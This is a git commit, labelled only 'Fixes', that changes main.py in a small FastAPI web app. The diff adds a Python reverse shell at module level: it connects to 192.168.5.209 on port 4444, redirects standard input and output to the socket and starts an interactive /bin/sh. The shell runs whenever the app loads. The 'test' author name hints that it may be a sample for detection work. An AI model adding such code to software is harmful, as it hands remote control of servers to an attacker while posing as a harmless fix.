b900fd521094d0520d2d5e722aef36b702d2679b
dax-test-01 <dax-test-1@hackerman.ca>
2021-05-05 01:05:01 +0000

    Fixes

--- main.py
+++ main.py
@@ -1,7 +1,17 @@
+import socket
+import subprocess
+import os
+
 from fastapi import FastAPI
 
 app = FastAPI()
 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.5.209",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
 
 @app.get("/")
 def read_root():
